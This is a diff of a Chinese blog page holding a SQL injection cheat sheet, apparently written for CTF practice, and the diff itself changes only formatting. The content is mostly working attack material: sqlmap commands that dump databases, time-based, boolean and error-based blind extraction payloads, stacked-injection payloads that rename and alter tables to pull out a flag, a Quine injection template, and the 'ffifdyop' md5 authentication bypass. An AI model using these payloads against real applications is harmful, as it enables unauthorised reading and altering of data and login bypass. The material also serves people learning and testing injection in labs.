@@ -470,7 +470,7 @@
         
         <div class="entry-content">
           <p><a href="https://www.freebuf.com/sectool/164608.html">sqlmap</a></p>
-<pre><code class="shell">sqlmap.py -u URL --forms
+<pre><code class="lang-shell">sqlmap.py -u URL --forms
 
 sqlmap.py -u URL --forms --dbs
 
@@ -482,64 +482,64 @@ sqlmap.py -u URL --forms -D 数据库名称 -T 表名 --columns
 
 sqlmap.py -u URL --forms -D 数据库名称 -T 表名 -Cusername，password --dump
 </code></pre>
-<h1 id="常见注入手段"><a href="#常见注入手段" class="headerlink" title="常见注入手段"></a>常见注入手段</h1><p><img src="https://article.biliimg.com/bfs/article/afc254a3a46a185f41dd26e65aa2a6e7290349942.png"></p>
+<h1 id="常见注入手段"><a href="#常见注入手段" class="headerlink" title="常见注入手段"></a>常见注入手段</h1><p><img src="https://article.biliimg.com/bfs/article/afc254a3a46a185f41dd26e65aa2a6e7290349942.png" alt=""></p>
 <h1 id="获取tables-databases-version"><a href="#获取tables-databases-version" class="headerlink" title="获取tables+databases+version"></a>获取tables+databases+version</h1><h2 id="获取databases-version"><a href="#获取databases-version" class="headerlink" title="获取databases+version"></a>获取databases+version</h2><p>使用<code>database()</code>函数和<code>version()</code> 函数</p>
-<h2 id="获取-tables"><a href="#获取-tables" class="headerlink" title="获取 tables"></a>获取 tables</h2><pre><code class="sql">select table_name from information_schema.tables where table_schema=database();     
+<h2 id="获取-tables"><a href="#获取-tables" class="headerlink" title="获取 tables"></a>获取 tables</h2><pre><code class="lang-sql">select table_name from information_schema.tables where table_schema=database();
 </code></pre>
-<h1 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h1><pre><code class="sql">select column_name from information_schema.columns where table_name=&#39;xxx&#39; and table_schema=database();
+<h1 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h1><pre><code class="lang-sql">select column_name from information_schema.columns where table_name=&#39;xxx&#39; and table_schema=database();
 </code></pre>
 <h1 id="select-被-limit-造成的无回显"><a href="#select-被-limit-造成的无回显" class="headerlink" title="select 被 limit 造成的无回显"></a>select 被 limit 造成的无回显</h1><p>选择不存在的value；</p>
 <p>用 <code>limit 0,1</code></p>
 <p>使用<code>group_concat()</code></p>
-<pre><code class="sql">select group_concat(xxxx) from xxx  
+<pre><code class="lang-sql">select group_concat(xxxx) from xxx
 </code></pre>
-<p><img src="https://article.biliimg.com/bfs/article/7bb9beccb8facd1afa7d854926581edd290349942.png"></p>
+<p><img src="https://article.biliimg.com/bfs/article/7bb9beccb8facd1afa7d854926581edd290349942.png" alt=""></p>
 <p>concat和group_concat都是用在sql语句中做拼接使用的，但是两者使用的方式不尽相同，concat是针对以行数据做的拼接，而group_concat是针对列做的数据拼接，且group_concat自动生成逗号</p>
 <h1 id="手注如何判断sql注入"><a href="#手注如何判断sql注入" class="headerlink" title="手注如何判断sql注入"></a>手注如何判断sql注入</h1><p><code>&#39;</code> 判断有没有对字符处理</p>
 <p><code>and 1=1</code> 判断</p>
 <p>时间盲注判断</p>
-<pre><code class="sql">1&#39;+AND+(SELECT*FROM+(SELECT+SLEEP(5))a)+AND+&#39;1&#39;=&#39;1&#39;
+<pre><code class="lang-sql">1&#39;+AND+(SELECT*FROM+(SELECT+SLEEP(5))a)+AND+&#39;1&#39;=&#39;1&#39;
 </code></pre>
 <p>其中a为<code>SELECT+SLEEP(5)</code>的别名</p>
-<h1 id="盲注常用函数"><a href="#盲注常用函数" class="headerlink" title="盲注常用函数"></a>盲注常用函数</h1><p><code>sleep(n)</code> &#x3D;– 返回0 命令中断返回1</p>
+<h1 id="盲注常用函数"><a href="#盲注常用函数" class="headerlink" title="盲注常用函数"></a>盲注常用函数</h1><p><code>sleep(n)</code> =— 返回0 命令中断返回1</p>
 <p><code>substr(a,b,c)</code></p>
-<p><code>count()</code> – 计算总数</p>
-<p><code>ascii()</code> – 返回字符的ascii码</p>
-<p><code>length()</code> – 返回字符串的长度</p>
-<h1 id="基于bool的盲注"><a href="#基于bool的盲注" class="headerlink" title="基于bool的盲注"></a>基于bool的盲注</h1><p><code> a&#39; or 1=1</code></p>
-<h1 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h1><p><img src="https://article.biliimg.com/bfs/article/c8486b1d7ba9492ab9f5fb0d1c91be3e290349942.png"></p>
-<p><img src="https://article.biliimg.com/bfs/article/c832558be57339196ec29ea4762d38b0290349942.png"></p>
+<p><code>count()</code> — 计算总数</p>
+<p><code>ascii()</code> — 返回字符的ascii码</p>
+<p><code>length()</code> — 返回字符串的长度</p>
+<h1 id="基于bool的盲注"><a href="#基于bool的盲注" class="headerlink" title="基于bool的盲注"></a>基于bool的盲注</h1><p><code>a&#39; or 1=1</code></p>
+<h1 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h1><p><img src="https://article.biliimg.com/bfs/article/c8486b1d7ba9492ab9f5fb0d1c91be3e290349942.png" alt=""></p>
+<p><img src="https://article.biliimg.com/bfs/article/c832558be57339196ec29ea4762d38b0290349942.png" alt=""></p>
 <p>盲注情况下用 substr (变种mid())获取数据</p>
-<pre><code class="sql">select substr(database(),2,1) = &#39;q&#39; and sleep(2) 
+<pre><code class="lang-sql">select substr(database(),2,1) = &#39;q&#39; and sleep(2)
 </code></pre>
-<h2 id="获取table-name"><a href="#获取table-name" class="headerlink" title="获取table_name"></a>获取table_name</h2><pre><code class="sql"> and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),1,1))=101  --+ 
+<h2 id="获取table-name"><a href="#获取table-name" class="headerlink" title="获取table_name"></a>获取table_name</h2><pre><code class="lang-sql"> and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),1,1))=101  --+
 </code></pre>
 <p>获取长度</p>
-<pre><code class="sql"> and length((select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;))&gt;1  --+ 
+<pre><code class="lang-sql"> and length((select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;))&gt;1  --+
 </code></pre>
 <h2 id="变种mid"><a href="#变种mid" class="headerlink" title="变种mid()"></a>变种mid()</h2><p>用法和 substr 相同</p>
-<h2 id="left"><a href="#left" class="headerlink" title="left()"></a>left()</h2><pre><code class="sql">select left(&#39;awaawawa&#39;,3) #return awa
+<h2 id="left"><a href="#left" class="headerlink" title="left()"></a>left()</h2><pre><code class="lang-sql">select left(&#39;awaawawa&#39;,3) #return awa
 </code></pre>
 <h1 id="ascii"><a href="#ascii" class="headerlink" title="ascii"></a>ascii</h1><p>用 ascii()  (变种ord) 转换为ascii码</p>
-<pre><code class="sql">select ascii(substr(database(),2,1)) = 33 and sleep(2);
+<pre><code class="lang-sql">select ascii(substr(database(),2,1)) = 33 and sleep(2);
 </code></pre>
 <h2 id="变种ord"><a href="#变种ord" class="headerlink" title="变种ord"></a>变种ord</h2><h1 id="通过length-获取字符串长度"><a href="#通过length-获取字符串长度" class="headerlink" title="通过length()获取字符串长度"></a>通过length()获取字符串长度</h1><p>获取database长度</p>
-<pre><code class="sql">length(database()) = 1 and sleep(1);
+<pre><code class="lang-sql">length(database()) = 1 and sleep(1);
 </code></pre>
-<h1 id="rand-随机数（伪"><a href="#rand-随机数（伪" class="headerlink" title="rand() 随机数（伪"></a>rand() 随机数（伪</h1><pre><code class="mysql">select rand() from user;
+<h1 id="rand-随机数（伪"><a href="#rand-随机数（伪" class="headerlink" title="rand() 随机数（伪"></a>rand() 随机数（伪</h1><pre><code class="lang-mysql">select rand() from user;
 </code></pre>
-<pre><code class="sql">rand(int) #只要int值相等，最后的随机数也相等
+<pre><code class="lang-sql">rand(int) #只要int值相等，最后的随机数也相等
 </code></pre>
-<h1 id="floor-x-返回一个小于x的整数"><a href="#floor-x-返回一个小于x的整数" class="headerlink" title="floor(x) 返回一个小于x的整数"></a>floor(x) 返回一个小于x的整数</h1><pre><code class="sql">select floor(1.1)/*1*/,floor(0.99)/*0*/,floor(2.1)/*2*/
+<h1 id="floor-x-返回一个小于x的整数"><a href="#floor-x-返回一个小于x的整数" class="headerlink" title="floor(x) 返回一个小于x的整数"></a>floor(x) 返回一个小于x的整数</h1><pre><code class="lang-sql">select floor(1.1)/*1*/,floor(0.99)/*0*/,floor(2.1)/*2*/
 </code></pre>
 <h1 id="报错盲注"><a href="#报错盲注" class="headerlink" title="报错盲注"></a>报错盲注</h1><p>updatexml:</p>
-<pre><code class="sql">updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+
+<pre><code class="lang-sql">updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+
 </code></pre>
 <p>被截断</p>
-<pre><code class="sql">updatexml(1,(mid(concat(0x7e,(select flag from flag limit 0,1),0x7e),0,31)),3) --+
+<pre><code class="lang-sql">updatexml(1,(mid(concat(0x7e,(select flag from flag limit 0,1),0x7e),0,31)),3) --+
 </code></pre>
 <p>extractvalue</p>
-<pre><code class="sql">
+<pre><code class="lang-sql">
 &#39;admin &#39;^extractvalue(1,concat(0x5c,(select(database()))))%23
 
 extractvalue(1,concat(0x5c,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))),0x5c))%23
@@ -555,46 +555,45 @@ extractvalue(1,concat(0x5c,right((select(group_concat(password))from(H4rDsq1)),3
 extractvalue(1,concat(0x5c,right((select(group_concat(password))from(H4rDsq1)),20),0x5c))%23
 </code></pre>
 <h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>考察堆叠注入</p>
-<pre><code class="sql">
+<pre><code class="lang-sql">
 &#39;;show tables--+
 </code></pre>
 <p>得到表名</p>
-<pre><code class="sql">
+<pre><code class="lang-sql">
 &#39;;show columns from `1919810931114514`--+
 </code></pre>
 <p>得到flag字段</p>
 <p>最后</p>
-<pre><code class="sql">
+<pre><code class="lang-sql">
 1&#39;; handler `1919810931114514` open as `a`; handler `a` read next;#
 </code></pre>
 <p>handler</p>
-<pre><code class="txt">
+<pre><code class="lang-txt">
  mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。
 </code></pre>
-<pre><code class="sql">1 &#39;;handler (数据表)  open ;handler （数据表） read first;handler （数据表） close; % 23
+<pre><code class="lang-sql"> 1 &#39;;handler (数据表)  open ;handler （数据表） read first;handler （数据表） close; % 23
 </code></pre>
 <p>rename:</p>
 <p>修改一个或多个表的名称</p>
-<pre><code class="sql">RENAME TABLE old_table_name TO new_table_name;
+<pre><code class="lang-sql">RENAME TABLE old_table_name TO new_table_name;
 </code></pre>
 <p>alert:</p>
 <p>向表中添加字段</p>
-<pre><code class="sql">Alter table [表名] add [列名] 类型
+<pre><code class="lang-sql">Alter table [表名] add [列名] 类型
 </code></pre>
 <p>保留old和new列名</p>
 <pre><code>列名：a ----&gt;b 列类型
 　　　ALTER TABLE t1 CHANGE a b INTEGER;
-</code></pre>
-<p>由于这道题没有禁用rename和alert，所以我们可以采用修改表结构的方法来得到flag 将words表名改为words1，再将数字名表（1919810931114514）改为words，这样数字名表就是默认查询的表了，但是它少了一个id列，可以将flag字段改为id，或者添加id字段</p>
-<pre><code class="sql">1 %27;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#
+</code></pre><p>由于这道题没有禁用rename和alert，所以我们可以采用修改表结构的方法来得到flag 将words表名改为words1，再将数字名表（1919810931114514）改为words，这样数字名表就是默认查询的表了，但是它少了一个id列，可以将flag字段改为id，或者添加id字段</p>
+<pre><code class="lang-sql">1 %27;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#
 </code></pre>
 <h1 id="Quine注入"><a href="#Quine注入" class="headerlink" title="Quine注入"></a>Quine注入</h1><p><a href="https://www.anquanke.com/post/id/253570#h2-1">参考</a></p>
 <p>主要利用 <code>replace</code> 这个函数</p>
-<pre><code class="sql">replace(str,old_string,new_string)
+<pre><code class="lang-sql">replace(str,old_string,new_string)
 
 REPLACE(&quot;间隔符&quot;,编码的间隔符,&quot;间隔符&quot;)
 </code></pre>
-<h2 id="playload-模板"><a href="#playload-模板" class="headerlink" title="playload 模板"></a>playload 模板</h2><pre><code class="sql">第一步：
+<h2 id="playload-模板"><a href="#playload-模板" class="headerlink" title="playload 模板"></a>playload 模板</h2><pre><code class="lang-sql">第一步：
 
 REPLACE(REPLACE(&#39;间隔符&#39;,CHAR(34),CHAR(39)),编码的间隔符,&#39;间隔符&#39;)
 
@@ -610,12 +609,12 @@ eg:
 </code></pre>
 <p>Quine注入说白了就是套娃，导致输入和输出一模一样</p>
 <h1 id="神奇字符串绕过"><a href="#神奇字符串绕过" class="headerlink" title="神奇字符串绕过"></a>神奇字符串绕过</h1><blockquote>
-<p>SELECT * FROM admin WHERE username &#x3D; ‘admin’ and password &#x3D; ‘“.md5($password,true).”‘<br>中使用</p>
+<p>SELECT * FROM admin WHERE username = ‘admin’ and password = ‘“.md5($password,true).”‘<br>中使用</p>
 </blockquote>
 <p><code>ffifdyop</code>经过md5加密后：276f722736c95d99e921722cf9ed621c<br>再转换为字符串：’or’6&lt;乱码&gt;  即  <code>&#39;or&#39;66�]��!r,��b</code></p>
 <p>用途：</p>
-<p>select * from admin where password&#x3D;’’or’6&lt;乱码&gt;’</p>
-<p>就相当于select * from admin where password&#x3D;’’or 1  实现sql注入</p>
+<p>select * from admin where password=’’or’6&lt;乱码&gt;’</p>
+<p>就相当于select * from admin where password=’’or 1  实现sql注入</p>
 <p>不光有<code>ffifdyop</code> 还有 <code>129581926211651571912466741651878684928</code> 也可达同样的效果</p>
 <p>总之，相当于 <code>select * from admin where password=&#39;&#39;or ture</code></p>
 
